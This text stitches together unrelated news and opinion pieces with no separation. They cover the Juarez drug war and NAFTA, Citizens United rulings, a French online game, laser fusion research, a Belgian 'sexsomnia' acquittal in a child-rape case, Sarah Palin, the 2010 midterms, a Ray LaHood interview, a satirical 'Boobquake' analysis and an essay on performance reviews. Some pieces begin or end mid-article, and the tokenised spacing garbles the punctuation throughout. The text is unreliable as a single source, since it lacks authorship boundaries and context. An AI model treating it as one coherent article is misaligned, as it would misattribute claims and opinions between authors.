Murders ran around 250 a year and sometimes the cartel left bodies on the street wrapped in yellow ribbon .
Carrillo ran the city and yet his name never appeared in the newspapers nor was mentioned on radio and television .
I thought I 'd stumbled into hell .
Now the city is dying .
About 5,000 people have been slaughtered in Ciudad Juarez in 27 months .
It is a destroyed city where 25 percent of the houses are abandoned and 40 percent of the businesses have closed .
There were 2,600 murders last year and killings are going on at a faster clip this year .
At night , no one is on the streets .
I realize that I was a fool in 1995 .
I had not stumbled into hell .
That was the golden age .
But one constant remains :
No matter how many die in Juarez , no matter how low the pay in the American factories , the U.S. government insists the War on Drugs is being won and that NAFTA is a big success .
The Mexican War on Drugs is not lost : it never seriously began .
The drug industry is an essential prop under a faltering Mexican economy and has been so for more than 20 years , since the peso crisis of the early 1980s .
The money flows into the hands of countless government officials , into the banking industry and into many investments in Mexico .
More people die each day as the government of President Felipe Calderon uses the Mexican army and the federal police to try to get the illegal drug industry under control .
Calderon was elected by a razor - thin margin and followed the custom of Mexican presidents by immediately making a show of force .
But he badly underestimated the power of the drug industry .
The profits are estimated by many analysts to be between $ 30 billion and $ 50 billion a year , although it 's notoriously difficult to track .
But it is not a piddling sum in a country where oil is the official highest earner of foreign currency and supplies 40 percent of the federal budget .
But the oil is running out .
Calderon has publicly stated that the oil fields will be gone in 10 years or less .
The next big earner is human flesh , the millions of Mexicans who have fled the economic doom of their nation and send more than $ 20 billion a year home from the United States .
But the recession and job losses in the U.S. have cut into that source .
Tourism ranks third in legitimate sources of money for Mexico , but in a nation where heads keep getting lopped off , tourism is n't thriving .
The illegal drug industry in Mexico employs hundreds of thousands of people .
No one knows the payroll , but certainly it includes many people in the army , the 3,500 separate police forces and the government from top to bottom .
It 's difficult to make a living wage legitimately here .
The pay varies , but in Ciudad Juarez , one of the most violent cities on Earth , the starting salary in the 400 foreign - owned factories , mainly American , is about 40 bucks a week .
There are 500 to 900 street gangs .
No one can live on the pay offered by these factories .
In a country with 50 percent of the population living in poverty , the turnover in these plants runs from 100 to 200 percent a year .
No one can live long in a gang -- but for a while , a kid can live well and feel that his life is a dream of money and power .
The U.S. approach to the killings in Mexico never looks at an economic reason , just as the consequences of our free trade treaty ( NAFTA ) are never brought up .
The effects wrought by NAFTA launched one of the largest human migrations in the world as poor Mexicans fled collapsing industry and agriculture .
Border Patrol statistics show that the number of Mexicans entering the U.S. illegally skyrocketed within two years of the passage of NAFTA .
We also never question our four - decades - old War on Drugs , which has produced cheaper drugs of higher quality at lower prices in thousands of U.S. cities and towns .
It has helped create one of the largest prison populations in the world .
If our drug policy were a ship , it would be called the Titanic .
Anyone who questions the propaganda of the U.S. government on the violence in Mexico , on our War on Drugs or on our free trade agreement is told to come up with a solution , some silver bullet that instantly slays the dragon .
But our policies over the decades have created a disaster , and it will take years to reverse the damage these acts of government have inflicted .
The time to start is now .
Let 's address the true and lethal nature of Mexico 's war on drugs -- one we are in part bankrolling under the Merida Initiative to the tune of half a billion dollars per year , often tossed into the murderous hands of many in the Mexican army .
We need to have a public discussion of the obvious : Legalize drugs or keep caging Americans for taking drugs -- unless of course they are booze , tobacco or happy pills from the doctor -- and keep financing the murders of Mexicans .
The first thing to do if we want to come clean about the slaughter in Mexico is start smelling the coffee .
We share a 1,900 - mile border .
We share a history and people .
At least 10 percent of the Mexican people now live in the United States as economic or political fugitives .
Recently , the secretaries of State , Homeland Security and Defense flew to Mexico City and promised the Mexican government we would continue exactly the same polices as in the past .
I have been told I should be reasonable .
I am .
And I expect the same of my government .
Building prisons and lending support to a murderous war on drugs must stop , and digging deep into the economics and politics behind the hellish state of affairs must begin .
It 's a testament to the Mexican people that no matter how hard life is in Juarez , they seem to endure , raise families , smile and try to create a better future .
As a Mexican friend told me , " I love Juarez , it is such a needy city . "
It is poor and dangerous , a tapestry of one - story buildings .
But once you know Juarez it haunts you no matter how you try to flee .
The opinions expressed in this commentary are solely those of Charles Bowden .
WASHINGTON — Two federal courts here issued decisions on Friday addressing the impact of Citizens United , January ’s big Supreme Court campaign finance ruling , on a new issue — whether the government may constitutionally restrict the size of contributions to groups that spend money to support political candidates .
One court said that individual contributions to advocacy groups known as 527s may not be limited .
Another said that contributions to political parties can , though it said it was aware the resulting playing field might not be a level one .
Stephen M. Hoersting , a lawyer for the winning side in the first case , said the ruling represented a logical and welcome extension of Citizens United .
“ The court affirmed , ” Mr. Hoersting said in a statement , “ that groups of passionate individuals , like billionaires — and corporations and unions after Citizens United — have the right to spend without limit to independently advocate for or against federal candidates . ”

De la forme ensuite : le jeu , tout en 3D avec un rendu de type BD , se joue avec un simple navigateur Internet , sans rien avoir à installer sur son ordinateur .
Un choix osé pour ce type de plate - forme , plus habituée aux petits jeux simples en 2D qu'aux jeux de rôle au long cours .
UNE DIFFICULTÉ ASSUMÉE
" Vous vous réveillez dans un hôpital en 2080 , au sud de Villeneuve d'Ascq ( périphérie lilloise ) , dans un monde détruit par un mystérieux événement ayant eu lieu vingt ans auparavant .
A partir de là , il va falloir trouver à manger , des vêtements , une planque , bref , survivre " , explique Laurent Righetti , chargé de la communauté des joueurs .
Et la tâche ne sera pas aisée .
Pas de banque ou de coffre - fort pour garder en sécurité son argent ou son équipement .
Au joueur de protéger ses biens avec les moyens du bord sous peine de se faire piller par un groupe ennemi .
Si son personnage tombe au combat , la sanction est immédiate : le personnage perd ses compétences durement acquises au fil de son aventure .
Les cartes des lieux traversés n'indiqueront pas l'endroit où se trouve le joueur .
Le nom des personnages rencontrés n'apparaîtra pas si on ne les connaît pas personnellement …
L'équipe du jeu assume la difficulté de Leelh , pas vraiment destiné aux joueurs débutants .
" C'est tellement emmerdant les jeux faciles …
Là , on voulait faire un vrai jeu , où si tu réussis un truc , c'est parce que tu es bon , pas parce qu'on t'a pris par la main " , souligne Laurent Righetti .
Seule solution pour s'en sortir dans cet univers hostile , jouer collectif .
Car l'équipe de Leelh souhaite encourager le jeu à plusieurs , et la création de clans parmi les joueurs .
" Dans l'idéal , on aimerait qu'il y ait des petites guerres entre des clans antagonistes .
Pour le moment , on a deux factions , l'une qui souhaite recréer le monde d'avant l'apocalypse en faisant des fouilles archéologiques , et une qui préfère piller les vestiges …
Entre eux , ça ne va pas le faire ! " , sourit le community manager .
L'accent est mis sur le roleplay ( jeu de rôle ) , le fait pour chaque joueur de se glisser dans la peau de son personnage .
" Quand on se connecte sur Leelh , on ne va pas parler du dernier match de foot de l'OM avec ses potes .
Il faut jouer le jeu . "
Pour tenir en haleine les joueurs , le scénario sera découpé en saisons , sur le modèle des séries télé .
Dans la saison 1 , il faudra découvrir les causes du cataclysme de 2060 .
Un élément longtemps resté top secret chez le développeur lillois .
L'IDENTITÉ RÉGIONALE , UN CHOIX À DOUBLE TRANCHANT
L'ambition ne manque donc pas .
Mais l'équipe de 3 D duo sait pertinemment que certains de ses choix risquent d'être mal reçus par certains joueurs .
En premier lieu , le modèle payant ( 6,50 euros par mois ) , inédit pour un jeu Web .
Et surtout le style graphique .
" Un gamer risque d'être rebuté .
Chez nous , un personnage fait 1 000 polygones , contre 13 000 sur Aion …
On arrive à un aspect BD , glauque , un peu fade au niveau des couleurs .
C'est pas vraiment Hello Kitty Online , reconnaît Laurent Righetti .
Soit on est considéré comme un jeu dégueu et moche , soit comme du génie .
C'est un pari . "
Autre coup de poker , l'identité régionale de Leelh .
Début 2009 , le jeu est partout dans les médias du Nord - Pas - de - Calais , alléchés par les dessins préparatoires représentant le centre de Lille détruit par le cataclysme .
Le tout jeune studio reçoit alors le soutien d'acteurs économiques régionaux , et du fond d'investissement NewFund Management , qui acquiert en juin 2009 34 % du capital de la société .
Pourtant , l'image " ch'ti " du jeu risque de le couper des joueurs non-nordistes , admet Laurent Righetti .
" C'est un choix de communication à double tranchant .
Il faut qu'on se dépêtre de cette image régionale , même si ça nous sert .
On a une image sympathique , les ‘ ch ' tis de Leelh ' .
Mais aussi une image amateur qui nous colle à la peau . "
Bien que jeune , l'équipe de 3 D duo n'est pas pour autant inexpérimentée .
Avant de se lancer dans l'aventure du MMO , le jeu multijoueur en ligne , les développeurs se sont faits les dents sur des serious games à destination des entreprises .
Une activité toujours présente dans les locaux de 3 Dduo , afin de rapporter des fonds pour Leelh .
" C'est sûr que comparé aux grosses machines comme Ankama , on est un peu les ' clodos du MMO ' " , rit le community manager .
Petits moyens , mais grandes idées , Leelh arrivera - t - il à s'imposer dans le monde des jeux en ligne ?
Réponse dans les prochaines semaines pour la sortie du jeu , et dès ce week - end pour l'ouverture de la version bêta publique .

Imagine if you could generate electricity using nuclear power that emitted no radioactivity : it would be the answer to the world 's dream of finding a clean , sustainable energy source .
That is the great hope raised by researchers who believe they have found a radical new path to the ultimate goal of solving the world 's energy crisis through nuclear fusion power , as detailed in a paper published in the journal Energy and Environmental Science .
The international team of researchers - led by Emeritus Professor Heinrich Hora , of the University of New South Wales Department of Theoretical Physics - has shown through computational studies that a special fuel ignited by brief but powerful pulses of energy from new high - energy lasers may be the key to a success that has long eluded physicists .
The intense laser beam would be used to ignite a fuel made of light hydrogen and boron - 11 .
The resulting ignition would be largely free of radioactive emissions and would release more than enough energy to generate electricity .
The amount of radiation released would be even less than that emitted by current power stations that burn coal , which contains trace amounts of uranium .
In another plus , the fuel source is plentiful and readily accessible and the waste product of ignition would be clean helium gas .
" This has the potential to be the best route to fusion energy , " says Steve Haan , an expert in nuclear fusion at Lawrence Livermore National Laboratory in California , in a news report in the Royal Chemical Society 's Highlights in Chemical Technology .
Both Haan and Hora caution that the study only demonstrates the potential of the new process and that much work would need to be done to demonstrate it in practice .
The conventional fusion process uses highly compressed spheres of deuterium and tritium as fuel .
Hora says the proposed new process overcomes previous objections to hydrogen - boron 11 fuel because it would not have to be compressed and therefore need much less energy than previously thought to start the ignition .
" It was a surprise when we used hydrogen - boron instead of deuterium - tritium , " says Hora .
" It was not 100,000 times more difficult to ignite , as it would be under the usual compression process .
It would be only 10 times more difficult , using the latest generation of lasers . "
As it happens , a unique new laser capable of producing the required amount of ignition energy is in its early stages of testing in the US at the Los Alamos National Laboratory .
Another extraordinarily powerful US laser known as the National Ignition Facility has been built at Lawrence Livermore National Laboratory : " It is the largest laser on earth and has cost about US$ 4 billion , " he says .
" The laser pulse of about few billionths of a second duration produces 500 times more power than all US power stations . "
Professor Hora , who founded the UNSW Department of Theoretical Physics in 1975 and has been an Emeritus Professor since 1992 , is known for his work on the theory of fusion energy with lasers .

But shortly afterwards , Bernard Squarcini , the head of the DCRI , countered her claim , saying an inquiry had indeed been conducted early March on the orders of France 's police chief , Frédéric Péchenard – who , it is assumed , received orders from Mr Sarkozy .
The aim , he said , was " to carry out a computer trackback to get as near as possible to the point of departure in time and , if possible to the source ( of the rumours ) " .
Man who raped his daughter , 4 , walks free after claiming he suffered from ' sexsomnia '
Belgium was rocked by a new paedophile scandal yesterday after a court acquitted a man of raping his four - year - old daughter because he claimed he was asleep at the time .
In a judgment condemned as ‘ the summit of perversity ’ and ‘ an open door for paedophiles ’ , an appeal court decided there was no proof the 30 - year - old father was awake and that therefore he should have the benefit of the doubt .
The man , identified only as Frederic L , admitted the assault , but he told the court in Mons , West Belgium , that he suffered from a very rare condition called ‘ sexomania ’ which led him to have sex while asleep .
A court in the Belgian town of Mons , pictured , has been told how a father raped his daughter while he was asleep
He was accused of raping the girl when she woke him up to open the door to the toilet .
He said that he came to his senses when his daughter began to scream : ' Papa it 's me .
It 's me . '
The man told a court in Mons : ' This is a sexual version of sleepwalking .
I was deeply ashamed when I found out what was happening .'
The divorced man , 30 , had been drinking with his friends before going to bed in the same room as his daughter .
The girl told her grandmother what had happened and she reported her father to the police .
In court defence lawyer Yves Degratie said : ' My client has had sleep problems for a long time .
When he was living with the girl 's mother he often had sex with her in his sleep .
' He could not remember what happened with his daughter the next day .
He is deeply sorry .
But he could do nothing about it .
He was powerless . '
Police psychiatrist Chris Dillen confirmed that sexsomnia is a rare medical condition and he knew of a similar case where a man raped his own daughter in his sleep .
' You have people who talk or walk in their sleep .
You have others who eat cakes and take things from the fridge .
And you have a few who want to have sex , ' he added .
The public prosecutor dropped the case .
State prosecutors had asked for an eight - year prison sentence .
But the girl 's mother was shocked by the court 's ruling .
' This verdict gives a green light to all rapists and paedophiles to escape the law , ' she said .
The public prosecutor is appealing against the ruling .
The case will damage Belgium ’s attempts to shake off its reputation as a hotbed of paedophiles .
It revived memories of Marc Dutroux , who was jailed for life in 2004 for kidnapping and abusing six girls , four of whom he killed .
Sexsomnia , also called sex sleep , was first identified in 1996 and is a classified sleep disorder characterized as a non - rapid - eye - movement ( N - REM ) parasomnia .
There have been several cases of people being acquitted of sexual assault because they were sleepwalking .
Last year lorry driver lan Ball , 35 , of Ormskirk , Lancashire , was charged with sexual assault but experts who examined his history of sleepwalking concluded he had not known what he was doing and he was cleared by a judge .
In 2008 Jane McKenna , 33 , from Hampshire , claimed she had been raped by a friend 's husband , Jason Jeal , only for him to be cleared on the basis that he was sleepwalking .

Jonathan Martin and I wrote today about a way in which the GOP 's relationship with Sarah Palin is clarifying :
Sarah Palin dominated a sleepy Southern Republican Leadership Conference here Friday , stealing a show that had largely been ceded to her by other Republicans of national stature .
When Palin was introduced , a few thousand of her conservative admirers held up cameras to capture her image and when she concluded her remarks in the Hilton ballroom on the banks of the Missippippi River , many in the crowd surged toward the stage to shake her hand — as those remaining in the audience chanted her first name .
In between , the crowd of southern GOP activists rose to its feet repeatedly to cheer her unrelenting attacks on President Obama , Democrats and the news media – all delivered in her rapid - fire , segue - free and at times disjointed style .
No other speaker in the first two days of this quadrennial party pep rally aroused nearly the fervor that Palin stirred , especially among her female supporters .
Some wore broaches bearing her name , others held up lipstick in solidarity when she was introduced and at least one was spotted toting a life - sized Palin cut - out through the Hilton lobby .
But the SRLC , held two years before the presidential year , is traditionally an important cattle call for aspiring GOP presidential candidates , and the wide admiration for Palin among the rock - ribbed Dixie Republicans gathered in the room was n't matched by a confidence that she was ready to run .
" I honor her a lot .
She has a lot going on , but in actuality I 'd like to see her run in 10 years , " said Sue Lowery , a Louisiana delegate who had just yelled " We love you , Sarah , " as Palin exited the stage .
" She 's doing a great job of polishing and learning and after we stop this regime and have eight years with a Republican , that will be a better time for her , " she said .
It was a sentiment widely echoed , even in the front rows of the gathering , where a group dominated by middle - aged women had arrived early to get close to the former Alaska governor .
" She 's a good role model for women .
She could be ready in four years , " said Maryann Riley , a South Carolina activist clad head to toe in red , white , and blue and wearing a Palin pin .
" I admire her for what she 's doing – I do n't think she ’s electable , " said an Arkansas delegate , Kathy Ross , who said she had n't been " comfortable " with Palin as a vice presidential selection and did n't think she was ready for that job either .
" I ca n't see her being president of the United States , " she said .
The widening gap between Palin 's Republican stardom and her national prospects was reinforced Friday by a Fox News poll that found that 51 % of registered voters say Palin 's support for a candidate would make them less likely to support that person , while only 25 % say it would make them more likely .
Even within GOP ranks , other polling shows that many in the party are n't sure she 's qualified for the Oval Office .
Not many would say so that directly here , but the distinction between Palin 's popularity as a figure who tells it like it is rather than as a potential president was on clear display – if at times difficult for sympathetic Republicans to voice .
In talking about the current Democratic majority and its fate in the 2010 elections , news editors have been using words such as “ slipping , ” “ imperiled , ” and even “ doomed ” in their headlines .
Reading such press , one gets the idea that the Republican Party is poised to take over the country and derail a nascent era of reforms even before it gets off the ground .
Some say the GOP takeover will be , perhaps , on a scale as grand as the 1994 “ revolution ” led by Newt Gingrich .
But April , despite the messages from the Republican Party and their friends in much of the media , is a strange time to consider the fate of a November election .
And even stranger to say it ’s fate is sealed .
Polls are notoriously misleading .
People ’s opinions are fluid .
And the Republican Party is on the wrong side of virtually all issues important to the American people .
To see how the Republican Party ’s program is exactly at odds with the desires of the people , all one has to do is look at the attitudes of the public towards Wall Street , and then at the Republicans in Congress , where they act as the chief defenders of the Goldman Sachs and their ilk .
Plus , the experience of the New York City 2009 mayoral election is instructive .
Voters were told for weeks , even right up to Election Day , that the mayoral race would be a blow out .
Billionaire Mayor Michael Bloomberg would defeat Democratic challenger Bill Thompson handily , the pollsters screamed .
The big question , according to the pundits , was whether Thompson would lose by more than 20 points , or less .
But hardly anyone in real life seemed to be saying they liked Bloomberg .
The most common refrain was , “ Why bother voting ?
He has it in the bag . ”
In essence , the media was operating in Bloomberg ’s camp , trying to create a self - fulfilling prophecy .
The polls were wrong .
Bloomberg won by less than five points , despite predictions of victory by a historic margin .
Bloomberg spent $ 200 million , more than any other municipal candidate in the history of the world .
How come he won by such a small margin ?
How were the polls so wrong ?
Polls focus on “ likely voters ” and “ prime voters ” ( those who ’ve voted in the past few elections , in primaries and in off - year elections ) .
But others have begun to register and vote .
Obama won in 2008 based on the mobilization of millions of people who had never voted before .
These newly - energized people were n’t counted in the polls then , and still are n’t .
Polls also fail to take into account the state of the movements around candidates , in this case , Thompson and Bloomberg .
The state of movements leads to another question : How did David come so close to slaying Goliath ?
Bloomberg had the support of Wall Street and lots of money , and a mass base of people he had won over through a combination of coded racism and fake liberal rhetoric .
But around Thompson was a potentially more powerful coalition .
He had the African American , Latino and Asian elected leadership in the city , as well as the clergy and other leaders of those communities .
These communities came out strong for Thompson .
Further , huge sections of the labor movement were behind the Democratic candidate : AFSCME District Council 37 , the Transport Workers Union Local 100 , and other unions in the city .
These unions were able to mobilize tens of thousands of members , as well as provide a grassroots , organizational backbone to the campaign .
It was this powerful movement that was able to bring Thompson so close to victory .
David was able to cause Goliath a great deal of pain , but his slingshot did n’t mortally wound .
Influences of racism and Bloomberg ’s bucks had an impact .
But the most significant factor that kept Goliath alive was a divided labor movement .
While two of the biggest unions went with Thompson , three of the others either did n’t endorse or went with Bloomberg .
Consequently , tens of thousands of working people were n’t mobilized , and the organization was weakened .
In contradiction to the mayoral race , the coalition came together completely in the race for city comptroller .
The entire labor movement , all of the communities of color , the LGBT community and many others came together behind John Liu .
Liu was running against three other candidates , all of whom Wall Street backed in an attempt to crush him .
But with this coalition ’s support , he won 40 percent in a four - way race , and crushed his Wall Street opponent in a run off .
The coalition , when united , crushed Wall Street and its candidate .
If we want to make sure the Republican extremists do n’t take back the House and Senate , the movement that elected Obama - mainly labor unions , the African American , Latino and Asian communities , women and young people - has to come together in states and congressional districts across the country .
Good news is many are already mobilizing for the November mid-term elections .
And many key coalition constituents are at work around big issues : health care , jobs , immigrant rights .
This helps to build unity , momentum and score victories .
That ’s why I am boldly predicting the Democrats will hold onto their majority , and pick up a few seats to boot .

The United States transportation secretary , Ray LaHood , recently caused a stir when he proclaimed that bicycling and walking should be given the same consideration as motorized transport in state and local transit projects .
Supporters , who continue to post notes of adulation and thanks on Mr. LaHood ’s Facebook page , say the acknowledgment of biking and walking as legitimate modes of transportation is long overdue .
Critics , conversely , believe the secretary is taking the country in the wrong direction .
Mr. LaHood , formerly a Republican congressman from Illinois , spoke with Green Inc. about his reasons for introducing the new policy , the impact it will have on transportation financing , and why bike paths are a good bang for the buck .
•
Q .
Bicycling and walking advocates had a very positive reaction to the policy change .
But here at Green Inc. , we heard mostly from critics who said it showed you were “ delusional ” or reflective of some sort of “ Maoist ” bent .
What ’s your response to the response ?
A .
My response is that this is what Americans want .
Americans want alternatives .
People are always going to drive cars .
We ’re always going to have highways .
We ’ve made a huge investment in our interstate highway system .
We ’ll always continue to make sure that those investments in the highways are maintained .
But , what Americans want is to get out of their cars , and get out of congestion , and have opportunities for more transit , more light rail , more buses , and some communities are going to street cars .
But many communities want the opportunity on the weekends and during the week to have the chance to bike to work , to bike to the store , to spend time with their family on a bike .
So , this is not just Ray LaHood ’s agenda , this is the American agenda that the American people want for alternatives to the automobile .
What ’s happened around America is people are buying bikes and they ’re using them for recreational purposes on the weekend and there ’s no better family way for people to spend a weekend than riding their bikes on these biking trails .
This is what Americans want and we ’re accommodating their needs to really find places to recreate .
And what could be healthier than taking a 30 - minute walk , which is recommended by every doctor in America , or hopping on your bike and riding four , five or six miles and enjoying the great outdoors ?
Look , this is a win-win .
This is a way for people to get out of their cars , a way for people to recreate , a way for people to get good exercise , and it ’s what Americans want to do .
Q .
In announcing the new policy , you used pretty forceful language , saying it was a “ sea change ” and “ the end of favoring motorized transportation at the expense of nonmotorized . ”
The actual policy , however , is more benign in tone , saying , “ well - connected walking and bicycling networks is an important component for livable communities , and their design should be a part of federal - aid project developments . ”
Do you stand by your initial characterization of the policy ?
A .
I think that livable and sustainable communities is a game changer .
It ’s a game changer because it ’s what Americans want .
It ’s a game changer because people do want to get out of congestion , they want to get out of their cars , they want to be able to enjoy the outdoors , they want to be able to recreate with their families .
And so it ’s a game changer from the point of view that it ’s a major component of livable and sustainable communities that provide alternatives to automobiles .
And some of it is transit , some of it is light rail , some of it is street cars , some of it is good buses .
But certainly a big part of it is the opportunity to bike or walk to the grocery store , to work , to the drug store or just spending time with the family and getting some good exercise .
Q .
In terms of the way federal transportation dollars will be spent on the ground , is this a zero sum game ?
Does more money for biking and walking mean less money for motorways ?
A .
We ’re always going to take care of our highways .
As I said , we have a state - of - the - art interstate system that ’s been developed over three or four decades .
We ’re not going to give up on our roads .
We know people are always going to drive cars .
They ’re going to use their cars for long distances .
But as we develop our livable and sustainable communities program , biking and walking paths will be a major component of it .
And they will get some significant dollars .
Q .
In response to the policy change , a member of Congress said he did n’t understand how you get a bang for the buck out of a bicycle project .
Why do you think they ’re a good investment ?
A .
You do n’t have to get a bang for the buck in every form of transportation .
Certainly , transit , it provides a good bus or light rail or other kinds of transportation services .
But , they do n’t make money doing it .
This is a good bang for the buck because it provides alternatives to people , and good exercise , and for people who are very health conscious and for people who want to spend time with their families .
This is a win , win , win .
It incorporates a lot of different opportunities for people and it ’s a good bang for good health , and a good bang for a different form of transportation , and it ’s what the American people want .
Q .
Was there any particular reason you wanted to introduce the new policy now ?
A .
It has more to do with the fact that we ’re rolling out our livable and sustainable communities as we travel around the country and I also was at a huge bikers ’ conference in Washington , D.C. , and we wanted to give them the chance to really understand that all of their hard work over a long period of time has finally paid off .
There ’s an administration in place now that has taken to heart their request for more walking and biking paths .
Editor 's note :
When we attempt to inject a little humor into our science content , sometimes it 's overlooked .
So be forewarned : humorous , not - entirely - serious science coverage ahead :
On Monday , a mass display of indecency by women who were indignant at a comment made by an Iranian cleric rocked the planet with earthquakes .
Or did it ?
The number of earthquakes on Monday , particularly a 6.5 - magnitude quake in Taiwan , might suggest that the tarting - up movement had some effect , but the boobquake founder 's data breakdown says different .
None of the analyses of the event thus far have met the rigorous statistical standards we require here at Ars , so we 'll take a look at the shortcomings and draw up some numbers of our own .
A recent spate of earthquakes prompted an Iranian cleric , Hojatoleslam Kazem Sedighi , to state that " many women who do not dress modestly ... lead young men astray , corrupt their chastity and spread adultery in society , which ( consequently ) increases earthquakes . "
In response , Jen McCreight of Blag Hag suggested that women should dress their sluttiest on April 26 to test Segidhi's theory , and christened the event " Boobquake . "
She also promised to run the numbers on earthquakes that day and see how it compared to the world 's normal behavior .
According to her interpretation of data , there were neither a greater number nor a greater severity of earthquakes on Monday ; actually , the Monday earthquakes were less intense than normal .
Her conclusion was that all of the low - cut tops and booty shorts seemed to have no effect on earthquakes , and may have even gentled them down a bit .
The New York Post and Vanity Fair , on the other hand , proclaimed the Boobquake a resounding success because of one 6.5 - magnitude earthquake in Taiwan .
Clearly a matter of this importance deserves some inspection .
First , we must understand that McCreight 's analysis appears to take into account every earthquake that happens the world over — including ones of tiny magnitudes , deep in the ocean , deep underground , and so on .
As for the Post , there are four 5 + magnitude earthquakes every day , and 6 + quakes occur every two or three days .
We feel we can do the Boobquake more statistical justice than this .
We present here our own analysis , starting with some assumptions to more closely tie human behavior and earthquake - related punishments :
Assumption # 1 : The earthquake arbiter has good aim .
What good would an earthquake punishing us for indecency be if it could n't a ) be felt in a populated area , and b ) kill someone ?
Therefore , we only count earthquakes of a magnitude of 5 or more that have a death toll of at least 1 person .
If looks can kill , then they should .
Assumption # 2 : The earthquake arbiter would not be cagey about the cause - and - effect process .
A punishment system that does n't allow us to target and correct transgressions would reflect poor management skills , so we will consider only earthquakes on the same day as the Boobquake to be possible punishments .
Based on data taken from the Utsu database for the years 1990 through 2008 , there is an average of 19 deadly earthquakes per year .
This means the odds of a deadly earthquake happening on any given day is about one in 20 , or a little more than a 5 percent chance .
If you 're willing to accept a sample of one , you 're right at the standard measure of statistical significance .
If there were a deadly earthquake the same day as the Boobquake , you could say with reasonable certanity that all the cleavage worked , since the odds against it are high .
It turned out that there were four earthquakes with a 5.0 or greater magnitude on Monday , which is an average number , and none of them were lethal .
That is to say , the Boobquake claimed no lives .
And since the pure chance of a deadly earthquake was low anyway , this style of analysis casts the effects of cleavage , exposed ankles , and elaborately coiffed hair on earthquakes as inconclusive at best .
By these standards , the Boobquake was a disappointing scientific , as well as geological , failure .
But maybe this is just an issue with this particular perspective .
For another take , let 's strike the first two assumptions and reverse them for a kinder , gentler entity who considers even smaller earthquakes to be sufficient punishment .
We 'll also add a third assumption :
Assumption # 3 . The earthquake arbiter would not be random .
If a women in a certain area are being offensive with their assets , they would be the ones to receive punishment , not some other unaware , chaste region .
Since the Boobquake movement originated online in the United States , it would be fair to assume that most of the activity , as it were , was located there , though there were surely smaller sets of participants in other areas like Western Europe .
In 2009 , there were 11,739 earthquakes of magnitude 3.0 or more in the entire world , and 16 percent of them were in the United States .
On April 26 , there were 22 such earthquakes total , and 12 of them , or 55 percent , occurred in the US .
By this measure , Americans paid a hefty tectonic price for every v-neck - shirted woman that walks down the street .
What we have n't accounted for here , though , are misattribution errors — at least one Internet user insists that a rise in earthquakes is due to the newly operating LHC .
But then , perhaps to take the Booquake seriously at all is to take it too seriously .
Maybe instead of refreshing the United States Geological Survey 's website , we should have been enjoying the view , or participating , as the case may be .
As we have statistically triumphed , so have we socially failed .
If you have attended one of our trainings then you have likely heard us make the comparison between pamphleteers of the American Revolution and today ’s bloggers .
Like pamphlets , today ’s blogosphere offers Conservative activists and candidates the opportunity to bypass the mainstream media , taking their message directly to the voters .
It is in tribute to that connection that American Majority produces these pamphlets .

Mike Murray , a surprisingly hapless HR manager at Microsoft , made a number of goofs , but the doozie was introducing a “ Ship It ” award shortly after he started the job .
The idea was that you would get a big lucite tombstone the size of a dictionary when your product shipped .
This was somehow supposed to give you an incentive to work , you see , because if you did n’t do your job– no lucite for you !
Makes you wonder how Microsoft ever shipped software before the lucite slab .
The Ship
It program was announced with an incredible amount of internal fanfare and hoopla at a big company picnic .
For weeks before the event , teaser posters appeared all over the corporate campus with a picture of Bill Gates and the words “ Why is this man smiling ? ” I ’m not sure what that meant .
Was Bill smiling because he was happy that we now had an incentive to ship software ?
But at the company picnic , it became apparent that the employees felt like they were being treated like children .
There was a lot of booing .
The Excel programming team held up a huge sign that said “ Why is the Excel team yawning ? ” The Ship
It award was so despised that there is even a ( non-fiction ) episode in Douglas Coupland ’s classic Microserfs in which a group of programmers try to destroy one with a blow torch .
Treating your rocket scientist employees as if they were still in kindergarten is not an isolated phenomenon .
Almost every company has some kind of incentive program that is insulting and demeaning .
At two of the companies I ’ve worked for , the most stressful time of year was the twice - yearly performance review period .
For some reason , the Juno HR department and the Microsoft HR department must have copied their performance review system out of the same Dilbertesque management book , because both programs worked exactly the same way .
First , you gave “ anonymous ” upward reviews for your direct manager ( as if that could be done in an honest way ) .
Then , you filled out optional “ self - evaluation ” forms , which your manager “ took into account ” in preparing your performance review .
Finally , you got a numerical score , in lots of non-scalar categories like “ works well with others ” , from 1 - 5 , where the only possible scores were actually 3 or 4 .
Managers submitted bonus recommendations upwards , which were completely ignored and everybody received bonuses that were almost completely random .
The system never took into account the fact that people have different and unique talents , all of which are needed for a team to work well .
Performance reviews were stressful for a couple of reasons .
Many of my friends , especially the ones whose talents were very significant but did n’t show up on the traditional scales , tended to get lousy performance reviews .
For example , one friend of mine was a cheerful catalyst , a bouncy cruise director who motivated everyone else when the going got tough .
He was the glue that held his team together .
But he tended to get negative reviews , because his manager did n’t understand his contribution .
Another friend was incredibly insightful strategically ; his conversations with other people about how things should be done allowed everyone else to do much better work .
He tended to spend more time than average trying out new technologies ; in this area he was invaluable to the rest of the team .
But in terms of lines of code , he wrote less than average , and his manager was too stupid to notice all his other contributions , so he always got negative reviews , too .
Negative reviews , obviously , have a devastating effect on morale .
In fact , giving somebody a review that is positive , but not as positive as that person expected , also has a negative effect on morale .
The effect of reviews on morale is lopsided : while negative reviews hurt morale a lot , positive reviews have no effect on morale or productivity .
The people who get them are already working productively .
For them , a positive review makes them feel like they are doing good work in order to get the positive review … as if they were Pavlovian dogs working for a treat , instead of professionals who actually care about the quality of the work that they do .
And herein lies the rub .
Most people think that they do pretty good work ( even if they do n’t ) .
It ’s just a little trick our minds play on us to keep life bearable .
So if everybody thinks they do good work , and the reviews are merely correct ( which is not very easy to achieve ) , then most people will be disappointed by their reviews .
The cost of this in morale is hard to understate .
On teams where performance reviews are done honestly , they tend to result in a week or so of depressed morale , moping , and some resignations .
They tend to drive wedges between team members , often because the poorly - rated are jealous of the highly - rated , in a process that DeMarco and Lister call teamicide : the inadvertent destruction of jelled teams .
Alfie Kohn , in a now - classic Harvard Business Review article , wrote :
… at least two dozen studies over the last three decades have conclusively shown that people who expect to receive a reward for completing a task or for doing that task successfully simply do not perform as well as those who expect no reward at all .
[ HBR Sept / Oct 93 ]
He concludes that “ incentives ( or bribes ) simply can’t work in the workplace ” .
DeMarco and Lister go further , stating unequivocally that any kind of workplace competition , any scheme of rewards and punishments , and even the old fashion trick of “ catching people doing something right and rewarding them , ” all do more harm than good .
Giving somebody positive reinforcement ( such as stupid company ceremonies where people get plaques ) implies that they only did it for the lucite plaque ; it implies that they are not independent enough to work unless they are going to get a cookie ; and it ’s insulting and demeaning .
Most software managers have no choice but to go along with performance review systems that are already in place .
If you ’re in this position , the only way to prevent teamicide is to simply give everyone on your team a gushing review .
